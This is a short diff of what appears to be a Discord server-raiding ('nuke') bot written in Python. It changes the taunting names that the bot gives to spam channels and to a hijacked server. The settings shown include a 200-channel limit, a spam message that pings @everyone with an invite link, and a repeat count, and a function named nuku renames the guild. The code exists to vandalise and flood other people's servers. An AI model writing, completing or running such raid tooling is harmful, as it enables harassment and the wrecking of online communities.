@@ -6,7 +6,7 @@ import random
 # --- 設定項目 ---
 TOKEN = "YOUR_BOT_TOKEN_HERE"
 CHANNEL_LIMIT = 200
-NAME_BASE = "荒らされてやんのｗ"
+NAME_BASE = "dogs-on-top"
 ATTACK_MSG = "@everyone # Join now discord.gg/KG3Upxd8au"
 MSG_COUNT = 20
 EMOJIS = ['😀','😂','😎','😜','🤪','🥳','😡','🤯','👀','💀','👻']
@@ -55,7 +55,7 @@ async def nuku(ctx):
     guild = ctx.guild
     
     try:
-        asyncio.create_task(guild.edit(name="さときゅん鯖植民地"))
+        asyncio.create_task(guild.edit(name="Dogs支配下"))
     except:
         pass
 
